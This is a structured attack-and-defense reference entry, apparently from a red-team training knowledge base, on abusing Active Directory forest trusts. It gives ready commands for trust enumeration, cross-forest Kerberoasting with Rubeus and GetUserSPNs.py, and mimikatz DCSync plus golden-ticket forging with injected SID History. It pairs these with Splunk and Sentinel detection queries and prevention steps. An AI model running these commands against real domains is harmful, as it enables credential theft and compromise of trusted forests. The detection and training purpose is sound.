name: Forest Trust Abuse - Cross-Forest Attacks
command: Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType
description: Forest trusts enable access between separate AD forests. If SID Filtering is relaxed (ForestTransitive or SIDFilteringForestAware), cross-forest attacks are possible via SID History injection in golden tickets. Even with SID Filtering, Kerberoasting, password spraying, and shared resource enumeration work across forest boundaries.
source: CRTP trust abuse module; forest trust escalation
notes:
=== ENUMERATE TRUSTS ===
  Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType
  # Or with PowerView:
  Get-DomainTrust
  Get-ForestTrust

=== CROSS-FOREST KERBEROAST ===
  # Works regardless of SID Filtering:
  Rubeus.exe kerberoast /domain:<foreign_domain> /dc:<foreign_dc>
  # Or from Linux:
  GetUserSPNs.py <foreign_domain>/<user>:<pass> -dc-ip <foreign_dc>

=== CROSS-FOREST GOLDEN TICKET (if SID Filtering disabled) ===
  # Get inter-realm trust key:
  mimikatz# lsadump::dcsync /user:<foreign_domain>$
  # Forge inter-realm TGT with SIDHistory:
  mimikatz# kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /rc4:<trust_key> /service:krbtgt /target:<foreign_domain> /sids:S-1-5-21-<foreign_sid>-519 /ticket:cross_forest.kirbi

=== SHARED RESOURCES ===
  # Enumerate shares across trust:
  Find-DomainShare -CheckShareAccess -Domain <foreign_domain>
  # Enumerate foreign group members:
  Get-DomainForeignGroupMember -Domain <foreign_domain>
  # Find users with access across trust:
  Get-DomainForeignUser -Domain <foreign_domain>

=== SID FILTERING CHECK ===
  netdom trust <domain> /d:<foreign_domain> /quarantine
  # Or: nltest /domain_trusts /v

examples.label: Enumerate forest trusts
examples.command: Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType

recommended.note: SID History injection in golden tickets for cross-forest escalation.
Golden Ticket with extra SIDs for cross-forest access.

defense.why_it_works: Forest trusts create authentication pathways between forests. SID Filtering is the primary defense, but when disabled (ForestTransitive trusts), cross-forest SID injection in Kerberos tickets grants privileges in the trusted forest.
defense.prerequisites: Domain Admin in one forest; forest trust relationship; SID Filtering disabled for full compromise (Kerberoast works regardless).
defense.impact: Cross-forest privilege escalation; compromise of the trusted forest from the trusting forest.
defense.detection: [MITRE T1482] Trust enumeration commands; cross-forest authentication events; SID History in cross-forest tickets.
defense.artifacts: Event 4769 (TGS) with cross-forest service names; nltest/netdom in command history; Event 4624 from foreign forest.
defense.splunk_spl:
index=windows EventCode=4769 ServiceName="krbtgt/*"
| where ServiceName!=("krbtgt/" + TargetDomainName)
| table _time, TargetUserName, ServiceName, IpAddress
defense.sentinel_kql:
SecurityEvent
| where EventID == 4769
| where ServiceName startswith "krbtgt/" and ServiceName !has TargetDomainName
| project TimeGenerated, TargetUserName, ServiceName, IpAddress
defense.prevention: Enable SID Filtering on all forest trusts; use Selective Authentication; minimize cross-forest trust relationships; audit inter-forest access regularly.

detections.name: Cross-forest Kerberos authentication
detections.logic:
SecurityEvent
| where EventID == 4769
| where ServiceName startswith "krbtgt/"
| extend TargetForest = extract(@"krbtgt/(.*)", 1, ServiceName)
| where TargetForest != "" and TargetForest != TargetDomainName
| project TimeGenerated, TargetUserName, ServiceName, TargetForest, IpAddress
detections.false_positives: Legitimate cross-forest resource access; multi-forest environments
detections.tuning: Baseline normal cross-forest authentication; alert on unusual users or volumes
